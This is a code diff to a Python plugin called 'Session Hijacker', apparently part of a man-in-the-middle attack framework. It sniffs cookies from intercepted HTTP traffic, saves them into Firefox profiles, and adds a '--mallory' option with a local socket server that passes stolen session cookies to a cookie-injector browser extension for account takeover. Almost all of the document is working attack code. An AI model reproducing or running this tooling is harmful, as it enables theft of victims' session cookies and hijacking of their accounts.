@@ -3,11 +3,14 @@
 from plugins.plugin import Plugin
 from libs.publicsuffix import PublicSuffixList
 from urlparse import urlparse
+import threading
 import os
 import sys
 import time
 import logging
 import sqlite3
+import json
+import socket
 
 class SessionHijacker(Plugin):
 	name = "Session Hijacker"
@@ -21,9 +24,11 @@ class SessionHijacker(Plugin):
 		self.options = options
 		self.psl = PublicSuffixList()
 		self.firefox = options.firefox
+		self.mallory = options.mallory
 		self.save_dir = "./logs"
 		self.seen_hosts = {}
 		self.sql_conns = {}
+		self.sessions = []
 		self.html_header="<h2>Cookies sniffed for the following domains\n<hr>\n<br>"
 
 		#Recent versions of Firefox use "PRAGMA journal_mode=WAL" which requires
@@ -38,6 +43,11 @@ class SessionHijacker(Plugin):
 		if not os.path.exists("./logs"):
 			os.makedirs("./logs")
 
+		if self.mallory:
+			t = threading.Thread(name='mallory_server', target=self.mallory_server, args=())
+			t.setDaemon(True)
+			t.start()
+
 		print "[*] Session Hijacker plugin online"
 
 	def cleanHeaders(self, request): # Client => Server
@@ -45,6 +55,9 @@ class SessionHijacker(Plugin):
 		client_ip = request.getClientIP()
 
 		if 'cookie' in headers:
+		
+			logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
+			
 			if self.firefox:
 				url = "http://" + headers['host'] + request.getPathFromUri()
 				for cookie in headers['cookie'].split(';'):
@@ -52,9 +65,10 @@ class SessionHijacker(Plugin):
 					cname = str(cookie)[0:eq].strip()
 					cvalue = str(cookie)[eq+1:].strip()
 					self.firefoxdb(headers['host'], cname, cvalue, url, client_ip)
-			else:
-				logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
 
+			if self.mallory:
+				self.sessions.append((headers['host'], headers['cookie']))
+				logging.info("%s Sent cookie to browser extension" % client_ip)
 
 	#def handleHeader(self, request, key, value): # Server => Client
 	#	if 'set-cookie' in request.client.headers:
@@ -66,6 +80,28 @@ class SessionHijacker(Plugin):
 	#		else:
 	#			logging.info(message)
 
+	def mallory_server(self):
+		host = ''
+		port = 20666
+		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		server.bind((host,port))
+		server.listen(1)
+		while True:
+			client, addr = server.accept()
+			if addr[0] != "127.0.0.1":
+				client.send("Hacked By China!")
+				client.close()
+				continue
+			request = client.recv(8192)
+			request = request.split('\n')
+			path = request[0].split()[1]
+			client.send("HTTP/1.0 200 OK\r\n")
+			client.send("Content-Type: text/html\r\n\r\n")
+			if path == "/":
+				client.send(json.dumps(self.sessions))
+			client.close()
+
 	def firefoxdb(self, host, cookie_name, cookie_value, url, ip):
 
 		session_dir=self.save_dir + "/" + ip
@@ -76,7 +112,7 @@ class SessionHijacker(Plugin):
 
 			try:
 				if not os.path.exists(session_dir):
-	                		os.makedirs(session_dir)
+							os.makedirs(session_dir)
 
 				db = sqlite3.connect(cookie_file, isolation_level=None)
 				self.sql_conns[ip] = db.cursor()
@@ -114,6 +150,7 @@ class SessionHijacker(Plugin):
 
 	def add_options(self, options):
 		options.add_argument('--firefox', dest='firefox', action='store_true', default=False, help='Create a firefox profile with captured cookies')
+		options.add_argument('--mallory', dest='mallory', action='store_true', default=False, help='Send cookies to the Mallory cookie injector browser extension')
 
 	def finish(self):
 		if self.firefox:
